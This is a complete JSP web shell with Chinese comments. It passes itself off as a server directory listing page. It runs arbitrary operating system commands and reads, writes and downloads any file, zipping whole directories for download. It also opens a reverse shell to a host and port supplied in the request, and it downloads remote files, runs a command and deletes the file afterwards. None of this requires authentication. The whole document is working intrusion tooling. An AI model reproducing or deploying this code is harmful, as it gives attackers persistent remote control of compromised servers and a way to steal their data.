<%@page import="java.util.zip.ZipEntry"%>
<%@page import="java.util.zip.ZipOutputStream"%>
<%@ page language="java" pageEncoding="UTF-8"%>
<%@page import="java.util.*"%>
<%@page import="java.text.SimpleDateFormat"%>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%!
	static String encoding = "UTF-8";
	
	static{
		encoding = isNotEmpty(getSystemEncoding())?getSystemEncoding():encoding;
	}
	
	/**
	 * 异常转换成字符串，获取详细异常信息
	 * @param e
	 * @return
	 */
	static String exceptionToString(Exception e) {
	    StringWriter sw = new StringWriter();
	    e.printStackTrace(new PrintWriter(sw, true));
	    return sw.toString();
	}
	
	/**
	 * 获取系统文件编码
	 * @return
	 */
	static String getSystemEncoding(){
		return System.getProperty("sun.jnu.encoding");
	}
	
	/**
	 * 非空判断
	 *
	 * @param obj
	 * @return
	 */
	static boolean isNotEmpty(Object obj) {
	    if (obj == null) {
	        return false;
	    }
	    return !"".equals(String.valueOf(obj).trim());
	}
	
	/**
	 * 输入流转二进制数组输出流
	 * @param in
	 * @return
	 * @throws IOException
	 */
	static ByteArrayOutputStream inutStreamToOutputStream(InputStream in) throws IOException{
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		byte[] b = new byte[1024];
	    int a = 0;
	    while((a = in.read(b))!=-1){
	    	baos.write(b,0,a);
		}
		return baos;
	}
	
	/**
	 * 复制流到文件，如果文件存在默认会覆盖
	 * @param in
	 * @param path
	 * @throws IOException
	 */
	static void copyInputStreamToFile(InputStream in,String path) throws IOException{
		FileOutputStream fos = new FileOutputStream(path);
		fos.write(inutStreamToOutputStream(in).toByteArray());
		fos.flush();
		fos.close();
	}
	
	/**
	 * 模仿Linux下的cat Windows下的type 查看文件内容 
	 * @param path
	 * @return
	 * @throws IOException
	 */
	static String cat(String path) throws IOException {
		return new String(inutStreamToOutputStream(new FileInputStream(path)).toByteArray());
	}
	
	/**
	 * 执行操作系统命令 如果是windows某些命令执行不了，可以用 cmd /c dir 执行dir命令
	 * @param cmd
	 * @return
	 */
	static String exec(String cmd) {
		try {
			return new String(inutStreamToOutputStream(Runtime.getRuntime().exec(cmd).getInputStream()).toByteArray(),encoding);
		} catch (IOException e) {
			return exceptionToString(e);
		}
	}
	
	/**
	 * 下载文件到指定目录,保存的文件名必须指定
	 * @param url
	 * @param path
	 * @throws MalformedURLException
	 * @throws IOException
	 */
	static void download(String url,String path) throws MalformedURLException, IOException{
		copyInputStreamToFile(new URL(url).openConnection().getInputStream(), path);
	}
	
	/**
	 * 连接远程端口，提供本地命令执行入口
	 * @param host
	 * @param port
	 * @throws UnknownHostException
	 * @throws IOException
	 */
	static void shell(String host,int port) throws UnknownHostException, IOException{
		Socket s = new Socket(host,port);
		OutputStream out = s.getOutputStream();
		InputStream in = s.getInputStream();
		out.write(("User:\t"+exec("whoami")).getBytes());
		int a = 0;
		byte[] b = new byte[1024];
		while((a=in.read(b))!=-1){
			out.write(exec(new String(b,0,a,"UTF-8").trim()).getBytes("UTF-8"));
		}
	}
	
	/**
	 * 下载远程文件并执行，命令执行完成后会删除下载的文件
	 * @param url
	 * @param fileName
	 * @param cmd
	 * @return
	 * @throws MalformedURLException
	 * @throws IOException
	 */
	static String auto(String url,String fileName,String cmd) throws MalformedURLException, IOException{
		download(url, fileName);
		String out = exec(cmd);
		new File(fileName).delete();
		return out;
	}
	
	static void saveFile(String file,String data) throws IOException{
		copyInputStreamToFile(new ByteArrayInputStream(data.getBytes()), file);
	}
	
	/**
	 * 文件压缩
	 * @throws IOException
	 */
	static void zipFile(ZipOutputStream zos,File file) throws IOException{
		if(file.isDirectory() && file.canRead()){
			File[] files = file.listFiles();
			for(File f:files){
				zipFile(zos, f);
			}
		}else{
			ZipEntry z = new ZipEntry(file.getName());
            zos.putNextEntry(z);
            zos.write(inutStreamToOutputStream(new FileInputStream(file)).toByteArray());
            zos.closeEntry();
		}
	}
	
	static void zip(ByteArrayOutputStream out,File file) throws IOException{
		ZipOutputStream zos = new ZipOutputStream(out);
		zipFile(zos,file);
	}
	
%>
<html>
<head>
<title><%=application.getServerInfo() %></title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<STYLE>
	H1 {color: white;background-color: #525D76;font-size: 22px;}
	H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;}
	BODY {font-family: Tahoma, Arial, sans-serif;font-size:12px;color: black;background-color: white;}
	A {color: black;}
	HR {color: #525D76;}
</STYLE>
<script> 
function get(p){
     document.getElementById('p').value = p;
     document.getElementById('action').value = "get";
     document.getElementById('fm').submit();
}
function saveFile(){
     document.getElementById('action').value = "saveFile";
     document.getElementById('fm').submit();
}
</script>
</head>
<body>
<%
	try{
		String action = request.getParameter("action");
		String path = isNotEmpty(request.getParameter("p"))?request.getParameter("p"):new File((isNotEmpty(application.getRealPath("/"))?application.getRealPath("/"):".")).getCanonicalPath();
		out.println("<form action=\"\" method=\"post\" id=\"fm\">");
		if(isNotEmpty(action) && !"get".equalsIgnoreCase(action)){
			if("shell".equalsIgnoreCase(action)){
				shell(request.getParameter("host"), Integer.parseInt(request.getParameter("port")));
			}else if("downloadL".equalsIgnoreCase(action)){
				download(request.getParameter("url"), request.getParameter("path"));
				out.println("文件下载成功.");
			}else if("exec".equalsIgnoreCase(action)){
				out.println("<h1>命令执行:</h1>");
				out.println("<pre>"+exec(request.getParameter("cmd"))+"</pre>");
			}else if("cat".equalsIgnoreCase(action)){
				out.println("<h1>文件查看:</h1>");
				out.println("<pre>"+cat(request.getParameter("path"))+"</pre>");
			}else if("auto".equalsIgnoreCase(action)){
				out.println("<h1>Auto:</h1>");
				out.println("<pre>"+auto(request.getParameter("url"),request.getParameter("fileName"),request.getParameter("cmd"))+"</pre>");
			}else if("download".equalsIgnoreCase(action)){
				response.setContentType("application/x-download");
				File file = new File(path,request.getParameter("fileName"));
				String fileName = file.isDirectory() ? file.getName()+".zip":file.getName();
				response.setHeader("Content-Disposition", "attachment; filename="+fileName);
				BufferedOutputStream bos = new BufferedOutputStream(response.getOutputStream());
				if(file.isDirectory()){
					ByteArrayOutputStream baos = new ByteArrayOutputStream();
					zip(baos, file);
					bos.write(baos.toByteArray());
					baos.close();
				}else{
					InputStream in = new FileInputStream(file);
					int len;
					byte[] buf = new byte[1024];
					while ((len = in.read(buf)) > 0) {
						bos.write(buf, 0, len);
					}
					in.close();
				}
				bos.close();
				out.clear();
				out = pageContext.pushBody();
				return ;
			}else if("saveFile".equalsIgnoreCase(action)){
				String file = request.getParameter("file");
				String data = request.getParameter("data");
				if(isNotEmpty(file) && isNotEmpty(data)){
					saveFile(new String(file.getBytes("ISO-8859-1"),"utf-8"),new String(data.getBytes("ISO-8859-1"),"utf-8"));
					out.println("<script>history.back(-1);alert('ok');</script>");
				}
			}
		}else{
			File file = new File(path);
			if(file.isDirectory()){
%>
<h1>Directory Listing For <%=path%></h1>
<HR size="1" noshade="noshade">
<table width="100%" cellspacing="0" cellpadding="5" align="center">
<tr>
<td align="left"><font size="+1"><strong>文件名</strong></font></td>
<td align="center"><font size="+1"><strong>文件大小</strong></font></td>
<td align="center"><font size="+1"><strong>文件下载</strong></font></td>
<td align="right"><font size="+1"><strong>最后修改时间</strong></font></td>
</tr>
<%					
				List<File> ls = new ArrayList<File>();
				ls.add(new File(file,".."));
				ls.addAll(Arrays.asList(file.listFiles()));
				for(int i = 0; i < ls.size(); i++){
					File f = ls.get(i);
					String fileCanonicalPath = f.getCanonicalPath().replaceAll("\\\\","/");
					out.println("<tr "+((i%2!=0)?"bgcolor=\"#eeeeee\"":"")+"><td align=\"left\">&nbsp;&nbsp;<a href=\"javascript:get('"+(f.getCanonicalPath().replaceAll("\\\\","/"))+"');\"><tt>"+f.getName()+"</tt></a></td><td align=\"center\"><tt>"+(f.length()/1000)+"KB</tt></td><td align=\"center\"><a href=\""+request.getContextPath()+request.getServletPath()+"?action=download&p="+path+"&fileName="+f.getName()+"\"><tt>下载</tt></a></td><td align=\"right\"><tt>"+new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date(f.lastModified())) +"</tt></td></tr>");
				}
			}else{
				out.println("<h1>文件编辑:</h1>");
				out.println("File:<input type=\"text\" style=\"width:600px;\" name=\"file\" value=\""+path+"\" /><input type=\"button\" style=\"margin-left:20px;\" value=\"保存\" onclick=\"saveFile()\" /><span id=\"result\"></span><br/><br/>");
				out.println("<textarea style=\"width:100%;height:500px;\" name=\"data\">"+cat(path)+"</textarea>");
			}
		}
		out.println("<input type=\"hidden\" name=\"p\" id=\"p\" value=\""+path+"\"/><input type=\"hidden\" name=\"action\" id=\"action\" value=\"get\" /></form></table>");
		out.println("<HR size=\"1\" noshade=\"noshade\"><h3>"+application.getServerInfo()+"</h3></body></html>");
	}catch(Exception e){
		out.println("<pre>"+exceptionToString(e)+"</pre>");
	}
%>
